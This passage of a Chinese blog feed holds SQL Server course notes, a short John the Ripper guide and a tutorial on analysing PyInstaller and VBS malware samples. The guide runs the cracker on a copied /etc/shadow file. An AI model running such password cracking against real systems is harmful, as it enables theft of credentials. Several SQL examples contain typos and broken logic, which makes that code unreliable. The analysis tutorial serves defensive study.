&lt;p&gt;这样，ρ={R11，R12，R2}是一个3NF模式集。&lt;/p&gt;

&lt;h1 id=&quot;系统数据库&quot;&gt;系统数据库&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;master&lt;/li&gt;
  &lt;li&gt;tempdb&lt;/li&gt;
  &lt;li&gt;model&lt;/li&gt;
  &lt;li&gt;msdb&lt;/li&gt;
  &lt;li&gt;resource&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;数据库文件&quot;&gt;数据库文件&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;主数据文件,扩展名:.mdf&lt;/li&gt;
  &lt;li&gt;辅助数据文件:扩展名:.ndf&lt;/li&gt;
  &lt;li&gt;事务日志文件:扩展名:.ldf&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;创建数据库&quot;&gt;创建数据库&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;CREATE DATAVASE JXGL
ON
(
    NAME=JXGL,
    FILENAME='\D:\...\JXGL.mdf',
    SIZE=5,
    FILEGROWTH=1
)
LOG ON
(
    NAME = JXGL_LOG,
    FILENAME='D:\..\JXGL_LOG.ldf',
    SIZE=2,
    MAXSIZE=20,
    FILEGROWTH=10%
)
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;完整性约束&quot;&gt;完整性约束&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;实体完整性&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;每一行看做一个实体,满足唯一性&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;域完整性&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;指定列数据有正确的数据类型,格式,范围&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;参照完整性&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;维持参照表和被参照表之间的数据一致性&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;创建数据库表例子&quot;&gt;创建数据库&amp;amp;表例子&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;　USE JXGL
　CREATE TABLE S
　(
     SNO NCHAR(9) NOT NULL,
     	CONSTRAINT PK_SNO PRIMARY KEY CLUSTERED
     	CHECK(SNO LIKE '201705121[0-9][0-9]'),
     SNAME NCHAR(8) NOT NULL,
     SEX NCHAR(2) NULL,
     BIRTHDATE DATE NULL,
     COLLEGE NCHAR(20) NULL
 )
 USE JXGL
 CREATE TABLE C
 (
 	CNO NCHAR(4) NOT NULL,
     CNAME NCHAR(20) NOT NULL,
     DESCRIPTION TEXT NULL,
     CREDIT REAL NULL,
     C_COLLEGE NCHAR(20)
     PRIMARY KEY(CNO)
 )
 USE JXGL
 CREATE TABLE SC
 (
     SNO CHAR(9) NOT NULL,
     CNO CHAR(4) NOT NULL,
     GRADE REAL NULL,
     PRIMARY KEY(SNO,CNO),
     FOREIGN KEY(SNO) REFERENCES S(SNO),
     FOREIGN KEY(CNO) REFERENCES C(CNO)
 )
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;数据库维护&quot;&gt;数据库维护&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;参看此篇&lt;a href=&quot;/_posts/2020-05-12-sql-server常用命令总结.md&quot;&gt;文章&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;维护例子&quot;&gt;维护例子&lt;/h1&gt;

&lt;p&gt;对Ｓ，ＳＣ，Ｃ的查询&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;统计所有学生选修的课程门数&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
GO
SELECT COUNT(DISTINCT CNO)
FROM SC
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;求选修Ｃ４号课程的学生的平均年龄&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
GO
SELECT AVG(AGE)
FROM S JOIN SC ON S.SNO=SC.SNO AND CNO='C4'
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;求学习计算机学院（ＣＳ）每门课程的学生平均成绩&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;SELECT SC.CNO,AVG(GARDE) 
 FROM SC JOIN C ON 
 SC.CNO = C.CNO and cddept = 'CS'
 GROUP BY SC.CNO
 GO
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;统计每门课程的学生选修人数（超过１０人的课程才统计）按人数降序排列，若人数相同，按课程号升序排列&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
GO
SELECT CNO,COUNT(SNO)
FROM SC
GROUP BY CNO HAVING COUNT(*)&amp;gt;10
ORDER BY 2 DESC,1
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;查询姓＂王＂的所有学生的姓名和年龄&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt; USE JXGL
GO
SELECT SNAME,AGE
FROM S
WHERE SNAME LIKE '王%'
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;在ＳＣ中查询成绩为空值的学生学号和课程号&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt; USE JXGL
GO
SELECT SNO,CNO
FROM SC
WHERE GRADE IS NULL
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;查询１９９７年９月１日前出生的信息学院和数学学院女生的信息&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;select * from S join SC on S.SNO = SC.SNO join C on SC.CNO = C.CNO
where brith &amp;lt; '1997-09-01' and (CDEPT = &quot;信息学院&quot; orCDEPT = &quot;数学学院&quot; )
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;在基本表Ｓ中检索每一门课程成绩都大于８０分的学生学号，姓名，性别，并存储在一个&lt;code&gt;已经存在&lt;/code&gt;的基本表ＳＴＵＤＥＮＴ（ＳＮＯ，ＳＮＡＭＥ，ＳＥＸ）&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;建表：
USE JXGL
GO
CREATE TABLE STUDENT(SNO CHAR(9) NOT NULL,
SNAME CHAR(8) NOT NULL,
SEX CHAR(2))
GO
查询结果插入：
USE JXGL
GO
INSERT INTO STUDENT(SNO,SNAME,SEX)
SELECT SNO,SNAME,SEX
FROM S
WHERE SNO IN (SELECT SNO
              FROM SC
              GROUP BY SNO HAVING MIN(GRADE)&amp;gt;80)
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;在ＳＣ中删除无成绩的学科元组&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
GO
DELETE FROM SC
        WHERE GRADE IS NULL
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;把＂张成民＂同学在ＳＣ中的选课记录全部删除&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
GO
DELETE 
        FROM SC
        WHERE SNO IN(SELECT SNO 
                FROM S 
                WHERE SNAME='张成民')
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;把选修“高等数学”课程中不及格的成绩全部改为空值&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
GO
UPDATE SC
          SET GRADE=NULL
          WHERE GRADE&amp;lt;60 AND CNO IN(SELECT CNO
                                FROM C
                                WHERE CNAME='高等数学')

GO
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;把低于总平均成绩的女同学成绩提高５％&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
GO
UPDATE SC
        SET GRADE=GRADE*1.05
        WHERE SNO IN(SELECT SNO
                FROM S 
                WHERE SEX='F')
                    AND GRADE&amp;lt;(SELECT AVG(GRADE)
                                 FROM SC)
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;存储过程&quot;&gt;存储过程&lt;/h1&gt;

&lt;p&gt;在教学管理数据库中，创建一个名为ＳＴＵ＿ＡＧＥ的存储过程，根据输入的学号，输出该学生的出生年份&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
IF EXISTS(SELECT * FROM  SYSOBJECTS WHERE NAME='STU_AGE' AND TYPE='P')
DROP PROCEDURE STU_AGE
GO
CREATE PROCEDURE STU_AGE
      @S_NAME CHAR(8)
AS
      SELECT YEAR(GETDATE()-AGE) AS 'YEAR'
      FROM S 
      WHERE SNAME=@S_NAME
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;创建ＧＲＡＤＥ＿ＩＮＦＯ存储过程，功能是查询某门课程所有学生成绩，显示字段ＣＮＡＭＥ，ＳＮＯ，ＳＮＡＭＥ，ＧＲＡＤＥ&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
IF EXISTS(SELECT * FROM  SYSOBJECTS WHERE NAME='GARDE_INFO' AND TYPE='P')
DROP PROCEDURE GARDE_INFO
GO
CREATE PROCEDURE GRADE_INFO
        @C_NAME VARCHAR(50)
AS
        SELECT CNAME,SC.SNO,SNAME,GRADE
        FROM S JOIN SC ON S.SNO=SC.SNO JOIN C ON SC.CNO=C.CNO AND CNAME=@C_NAME     
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;触发器&quot;&gt;触发器&lt;/h1&gt;

&lt;p&gt;创建触发器ＴＲ＿Ｃ＿ＩＮＳＥＲＴ，在Ｃ表中插入一条新元组，触发器触发，给出＂你插入了一门新课程!＂信息&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
CREATE TRIGGER TR_C_INSERT
ON C
       FOR
          INSERT
AS 
        PRINT '你插入了一门新的课程！'
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ＡＦＴＥＲ触发器，在ＳＣ表创建一个插入，更新类型的触发器ＴＲ＿ＧＲＡＤＥ＿ＣＨＥＣＫ，当ＧＲＡＤＥ字段中插入或修改成绩后触发，检查是否在０～１００之间&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JAGL
CREATE TRIGGER TR_GRADE_CHECK
ON SC
       FOR
          INSERT，UPDATE
AS 
  DECLARE @SC_grede tinyint
SELECT @SC_grade=SC.grade
FROM SC
IF (@SC_grade NOT BETWEEN 0 AND 100)
          PRINT '你插入的成绩不在0~100之间！'
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;用户自定义函数&quot;&gt;用户自定义函数&lt;/h1&gt;

&lt;p&gt;创建函数Ｃ＿ＭＡＸ，根据输入的课程名称，输出该门课程最高分数的同学学号&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
IF EXISTS(SELECT * FROM SYSOBJECTS WHERE NAME = 'C_MAX' AND TYPE = FN)
DROP FUNCTION dbo.C_MAX
GO
CREATE FUNCTION C_MAX
(@C_NAME CHAR(8))
      RETURNS CHAR(20)
     AS
BEGIN
          DECLARE @S_MAX REAL
          SELECT @S_MAX=MAX(GRADE) 
          FROM SC JOIN C ON SC.CNO=C.CNO AND C.CNAME=@C_NAME
          RETURN (SELECT SNO FROM SC WHERE GARDE= @S_MAX)
END
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;创建ＳＮＯ＿ＩＮＦＯ函数，根据输入的课程名称，输出选修该门课程的学生学号，姓名，性别，系部，成绩&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
IF EXISTS(SELECT * FROM SYSOBJECTS WHERE NAME = 'SNO_INFO' AND TYPE = IF)
DROP FUNCTION dbo.SNO_INFO
CREATE FUNCTION SNO_INFO
(@C_NAME CHAR(8))
 RETURNS TABLE
     AS
     RETURN(SELECT S.SNO,SNAME,SEX,SDEPT,GRADE
          FROM S JOIN SC ON S.SNO=SC.SNO JOIN C ON SC.CNO=C.CNO AND C.CNAME=@C_NAME)          
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;混合验证方式&quot;&gt;混合验证方式&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;ＳＱＬ　ｓｅｒｖｅｒ&lt;/li&gt;
  &lt;li&gt;Ｗｉｎｄｏｗｓ&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;备份&quot;&gt;备份&lt;/h1&gt;

&lt;h2 id=&quot;完整备份&quot;&gt;完整备份&lt;/h2&gt;

&lt;p&gt;备份整个数据库所有内容,包括事务日志,在还原时,只需还原一个备份文件即可&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE master
GO
BACKUP DATABASE JXGL
TO DISK='D:\...path...\JXGL_BACKUP.bak'
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;差异备份&quot;&gt;差异备份&lt;/h2&gt;

&lt;p&gt;是对完整备份的补充,只是备份上次完整备份后更改的数据,量更小,速度更快&lt;/p&gt;

&lt;p&gt;数据还原时,需要先还原前一次完整备份数据,然后再还原差异备份的数据&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;BACKUP DATABASE &amp;lt;数据库名字&amp;gt;
TO DISK|TAPE=&amp;lt;物理文件名&amp;gt;
WITH DIFFERENTIAL
;--------例子
USE master
GO
BACKUP DATABASE JAGL
TO DISK='D:\...\FIRSTBACKUP'
WITH DIFFERENTIAL,
NOINIT
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;事务日志备份&quot;&gt;事务日志备份&lt;/h2&gt;

&lt;p&gt;事务备份只备份事务日志中的内容.事务日志记录了上一次完整备份或事务日志备份后数据库所有变动过程,所以在事务备份前,一定要先做完整备份.&lt;/p&gt;

&lt;p&gt;还原时,除了要还原上一次完整备份内容,还要依次还原每个事务日志备份,而不是最后一个事务日志备份&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;BACKUP LOG &amp;lt;数据库名&amp;gt;
TO DISK|TYPE = &amp;lt;NAME&amp;gt;
WITH DIFFERENTIAL
;----------------
;例子:事务日志备份,且追加到现有备份firstbackup
USE master
GO
BACKUP LOG JXGL
TO DISK='....\firstbackup'
WITH NOINIT
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;例题&lt;/p&gt;

  &lt;p&gt;备份JXGL和还原JXGL全过程&lt;/p&gt;

  &lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;;创建my_disk备份设备
USE master
GO
EXEC  sp_addumpdevice 'disk','my_disk','D:\....\Dump.bak'
&lt;/code&gt;&lt;/pre&gt;

  &lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;;备份
USE master
GO
BACKUP DATABASE JXGL
TO DISK='d:\...\Dump2.bak'
BACKUP LOG JXGL TO DISK='D:\...\Dump2.bak' WITH NORECOVERY
&lt;/code&gt;&lt;/pre&gt;

  &lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;;还原

USE master
GO
RESTORE DATABASE JXGL
FROM DISK='D:\....\Dump2.bak'
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;还原模式&quot;&gt;还原模式&lt;/h1&gt;

&lt;h2 id=&quot;完全还原&quot;&gt;完全还原&lt;/h2&gt;

&lt;p&gt;选择完全还原常使用如下备份策略:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;完整数据库备份&lt;/li&gt;
  &lt;li&gt;差异备份&lt;/li&gt;
  &lt;li&gt;事务日志备份&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;大容量日志还原&quot;&gt;大容量日志还原&lt;/h2&gt;

&lt;p&gt;是对完全还原模式的补充,也就是对大容量操作进行最小日志记录&lt;/p&gt;

&lt;h2 id=&quot;简单还原&quot;&gt;简单还原&lt;/h2&gt;

&lt;p&gt;指在还原时,仅仅使用了数据库完整备份或差异备份,而不涉及事务日志备份&lt;/p&gt;</content><author><name></name></author><category term="sql" /><summary type="html">[toc]</summary></entry><entry><title type="html">John_the_Ripper</title><link href="http://localhost:4000/_posts/2020-06-22-John_the_Ripper/" rel="alternate" type="text/html" title="John_the_Ripper" /><published>2020-06-22T00:00:00+08:00</published><updated>2020-06-22T00:00:00+08:00</updated><id>http://localhost:4000/_posts/John_the_Ripper</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-22-John_the_Ripper/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;安装&quot;&gt;安装&lt;/h1&gt;

&lt;p&gt;官方网站：http://www.openwall.com/john/&lt;/p&gt;

&lt;p&gt;下载：wget http://www.openwall.com/john/j/john-1.8.0.tar.gz&lt;/p&gt;

&lt;p&gt;解压：tar -xvf john-1.8.0.tar.gz&lt;/p&gt;

&lt;p&gt;进入src目录：&lt;/p&gt;

&lt;p&gt;cd john-1.8.0 &amp;amp;&amp;amp; cd src&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;make
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;根据自己系统版本选择,一般为如下&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;make clean linux-x86-64
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;编译成功会在run目录下生成john可执行文件&lt;/p&gt;

&lt;h1 id=&quot;破解&quot;&gt;破解&lt;/h1&gt;

&lt;p&gt;把想破解的/etc/shadow放在shadow.txt文件夹下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./john shadow.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;John the Ripper的默认密码字典为run目录下的password.lst&lt;/p&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">恶意脚本分析</title><link href="http://localhost:4000/_posts/2020-06-20-%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/" rel="alternate" type="text/html" title="恶意脚本分析" /><published>2020-06-20T00:00:00+08:00</published><updated>2020-06-20T00:00:00+08:00</updated><id>http://localhost:4000/_posts/%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-20-%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;python样本分析&quot;&gt;python样本分析&lt;/h1&gt;

&lt;h2 id=&quot;如何打包&quot;&gt;如何打包&lt;/h2&gt;

&lt;p&gt;pyinstaller&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;usage: pyinstaller [-h] [-v] [-D] [-F] [--specpath DIR] [-n NAME]
                   [--add-data &amp;lt;SRC;DEST or SRC:DEST&amp;gt;]
                   [--add-binary &amp;lt;SRC;DEST or SRC:DEST&amp;gt;] [-p DIR]
                   [--hidden-import MODULENAME]
                   [--additional-hooks-dir HOOKSPATH]
                   [--runtime-hook RUNTIME_HOOKS] [--exclude-module EXCLUDES]
                   [--key KEY] [-d {all,imports,bootloader,noarchive}] [-s]
                   [--noupx] [--upx-exclude FILE] [-c] [-w]
                   [-i &amp;lt;FILE.ico or FILE.exe,ID or FILE.icns&amp;gt;]
                   [--version-file FILE] [-m &amp;lt;FILE or XML&amp;gt;] [-r RESOURCE]
                   [--uac-admin] [--uac-uiaccess] [--win-private-assemblies]
                   [--win-no-prefer-redirects]
                   [--osx-bundle-identifier BUNDLE_IDENTIFIER]
                   [--runtime-tmpdir PATH] [--bootloader-ignore-signals]
                   [--distpath DIR] [--workpath WORKPATH] [-y]
                   [--upx-dir UPX_DIR] [-a] [--clean] [--log-level LEVEL]
                   scriptname [scriptname ...]
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;–onefile 将结果打包成一个可执行文件&lt;/li&gt;
  &lt;li&gt;–onedir 将所有结果打包到一个文件夹中，该文件夹包括一个可执行文件和可执行文件执行时需要的依赖文件（默认）&lt;/li&gt;
  &lt;li&gt;–paths=DIR 设置导入路径&lt;/li&gt;
  &lt;li&gt;–distpath=DIR 设置将打包的结果文件放置的路径&lt;/li&gt;
  &lt;li&gt;–specpath=DIR 设置将spec文件放置的路径&lt;/li&gt;
  &lt;li&gt;–windowed 使用windows子系统执行，不会打开命令行（只对windows有效）&lt;/li&gt;
  &lt;li&gt;–nowindowed 使用控制台子系统执行（默认）（只对windows有效）&lt;/li&gt;
  &lt;li&gt;–icon=&lt;FILE.ICO&gt; 将file.ico添加为可执行文件的资源(只对windows有效）&lt;/FILE.ICO&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;运行如下命令&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pyinstaller --onefile --nowindowed filename.py
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在当前文件下生成了build文件夹、dist文件夹和.spec文件&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;.spec文件是配置规范文件&lt;/li&gt;
  &lt;li&gt;build里存放将被打包的文件 exe文件就存放在dist文件夹下&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;__pycache__&lt;/code&gt;是pyc文件&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;pyc文件&quot;&gt;pyc文件&lt;/h3&gt;

&lt;p&gt;pyc是一种二进制文件，是由py文件经过编译后，生成的文件，是一种byte code，py文件变成pyc文件后，加载的速度有所提高，而且pyc是一种跨平台的字节码，是由python的虚拟机来执行的，这个是类似于JAVA或者.NET的虚拟机的概念。pyc的内容，是跟python的版本相关的，不同版本编译后的pyc文件是不同的，2.5编译的pyc文件，2.4版本的 python是无法执行的。&lt;/p&gt;

&lt;h3 id=&quot;pyo文件&quot;&gt;pyo文件&lt;/h3&gt;

&lt;p&gt;pyo是优化编译后的程序 python -O 源文件即可将源程序编译为pyo文件&lt;/p&gt;

&lt;h3 id=&quot;pyd文件&quot;&gt;pyd文件&lt;/h3&gt;

&lt;p&gt;pyd是python的动态链接库。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;为什么需要pyc文件&lt;/p&gt;

  &lt;p&gt;因为py文件是可以直接看到源码的，如果你是开发商业软件的话，不可能把源码也泄漏出去吧？所以就需要编译为pyc后，再发布出去。当然，pyc文件也是可以反编译的，不同版本编译后的pyc文件是不同的，根据python源码中提供的opcode，可以根据pyc文件反编译出  py文件源码，网上可以找到一个反编译python2.3版本的pyc文件的工具，不过该工具从python2.4开始就要收费了，如果需要反编译出新版本的pyc文件的话，就需要自己动手了,不过你可以自己修改python的源代码中的opcode文件，重新编译 python，从而防止不法分子的破解&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;关于打包的exe位数&quot;&gt;关于打包的exe位数&lt;/h3&gt;

&lt;p&gt;如果你想打包为32位的程序，那么请在32位的windows环境下进行打包。如果你想打包为64位的程序，那么请在64位的windows环境下进行打包。&lt;/p&gt;

&lt;h2 id=&quot;特征&quot;&gt;特征&lt;/h2&gt;

&lt;h3 id=&quot;图标特征&quot;&gt;图标特征&lt;/h3&gt;

&lt;p&gt;用pyintaller打包的exe，在没有指定图标的情况下默认的图标都是这一个，包括驱动人生的那几个木马，都是这样的图标，辨识度可以说是很高了。但是这个特征是可以被避免的，仅供参考&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/pyicon.PNG&quot; alt=&quot;pyicon&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;字符串特征&quot;&gt;字符串特征&lt;/h3&gt;

&lt;p&gt;你会看到__main__和__file__以及一堆以py开头的函数。明明只写了一个hello world，为什么会有这么多字符串呢？这是因为python是个解释型语言，pyinstaller打包的时候实际上是将python的解释器和py文件一起打包成了一个exe。所以这个字符串特征几乎是不可避免的&lt;/p&gt;

&lt;h3 id=&quot;编译器特征&quot;&gt;编译器特征&lt;/h3&gt;

&lt;p&gt;使用&lt;strong&gt;Detect It Easy&lt;/strong&gt;这个软件查看,类似Linux &lt;strong&gt;strace&lt;/strong&gt;命令&lt;/p&gt;

&lt;p&gt;可以看到hello.exe的编译器为VS14.0，这是因为python是基于VS14版本的，这也可以作为一个辨识的特征&lt;/p&gt;

&lt;h3 id=&quot;反编译&quot;&gt;反编译&lt;/h3&gt;

&lt;p&gt;这需要两个步骤，首先由exe获取pyc文件，再由pyc获取py文件&lt;/p&gt;

&lt;p&gt;反编译python生成的exe需要用到pyinstaller库里的archive_viewer.py脚本。archive_viewer.py一共有四个可用命令：&lt;/p&gt;

&lt;p&gt;U: go Up one level
O &lt;name&gt;: open embedded archive name
X &lt;name&gt;: extract name
Q: quit&lt;/name&gt;&lt;/name&gt;&lt;/p&gt;

&lt;h4 id=&quot;由exe获取pyc&quot;&gt;由exe获取pyc&lt;/h4&gt;

&lt;p&gt;首先找到archive_viewer.py这个脚本的路径&lt;/p&gt;

&lt;p&gt;运行&lt;code&gt;python archive_viewer.py C:\hello.exe&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;提取主程序的pyc文件&quot;&gt;提取主程序的pyc文件&lt;/h4&gt;

&lt;p&gt;&lt;code&gt;x hello&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;由于用pyinstaller打包后，pyc文件的前8个字节会被抹掉，所以最后要自己添加回去。前四个字节为python编译的版本，后四个字节为时间戳，时间戳可以任意，编译器版本python2.7 为03 f3 0d 0a，python3.4 为ee 0c 0d 0a&lt;/p&gt;

&lt;h4 id=&quot;由pyc获取py&quot;&gt;由pyc获取py&lt;/h4&gt;

&lt;p&gt;最后使用&lt;code&gt;easy python decompiler&lt;/code&gt;这个软件从pyc文件得到py文件，直接将pyc文件拖拽进程序&lt;/p&gt;

&lt;h2 id=&quot;python代码混淆的解决方案&quot;&gt;python代码混淆的解决方案&lt;/h2&gt;

&lt;p&gt;python代码的混淆相对会比较简单，只是单纯利用宏替换的原理修改变量和函数名，这个网站是目前用的最多的python代码混淆工具：http://pyob.oxyry.com/&lt;/p&gt;

&lt;h2 id=&quot;去除python代码混淆&quot;&gt;去除python代码混淆&lt;/h2&gt;

&lt;p&gt;直接替换晦涩难懂的变量名&lt;/p&gt;

&lt;h1 id=&quot;vbs样本分析&quot;&gt;vbs样本分析&lt;/h1&gt;

&lt;h2 id=&quot;vbs病毒介绍&quot;&gt;vbs病毒介绍&lt;/h2&gt;

&lt;p&gt;VBS病毒是用VB Script编写的，它利用Windows系统的开放性，通过调用现有的Windows对象、组件，程序可以直接控制文件、系统、注册表，功能非常强大。VBS脚本病毒通常的传播方式有：通过Email附件、IRC聊天通道、局域网共享传播，还可以通过感染htm、jsp、php 、asp等网页文件传播，传播范围比较广泛，它的变种多，迷惑性很强，所以电脑如果中了这种病毒就会很麻烦。
vbs类的病毒如何动态调试是个很大的问题，微软的地表最强IDE Visual Studio就能做到这一点。&lt;/p&gt;

&lt;h2 id=&quot;用vs调试vbs脚本&quot;&gt;用VS调试vbs脚本&lt;/h2&gt;

&lt;p&gt;首先用管理员方式启动VS，接着选择调试-&amp;gt;选项，把脚本前面的勾给打上&lt;/p&gt;

&lt;h2 id=&quot;启动调试器&quot;&gt;启动调试器&lt;/h2&gt;

&lt;p&gt;命令行输入&lt;code&gt;wscript /X 要调试vbs脚本的路径&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;WScript.exe命令说明&lt;/p&gt;

&lt;p&gt;WScript.exe [vbs文件全路径] [参数1] [参数2] […] [参数n] //D //
参数说明：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;D 打开调试程序&lt;/li&gt;
  &lt;li&gt;X 在调试程序中启动该程序&lt;/li&gt;
  &lt;li&gt;? 可以使用该参数查看WScript.exe的所有参数及说明&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;然后你就可以开始用VS来调试vbs脚本了，可以看堆栈 看内存，看局部变量&lt;/p&gt;

&lt;h2 id=&quot;vbs病毒混淆解决方案&quot;&gt;vbs病毒混淆解决方案&lt;/h2&gt;

&lt;p&gt;vbs病毒最严重的就是混淆了， 不管怎么混淆，大致都能用以下两种解决方案&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如果能直接打印或输出到文件则不需要关注语法，直接将结果打印&lt;/li&gt;
  &lt;li&gt;如果不能直接看到结果则根据函数及参数含义弄清混淆原理之后手动将混淆结果替换&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;宏病毒样本分析&quot;&gt;宏病毒样本分析&lt;/h1&gt;

&lt;h2 id=&quot;什么是宏&quot;&gt;什么是宏&lt;/h2&gt;

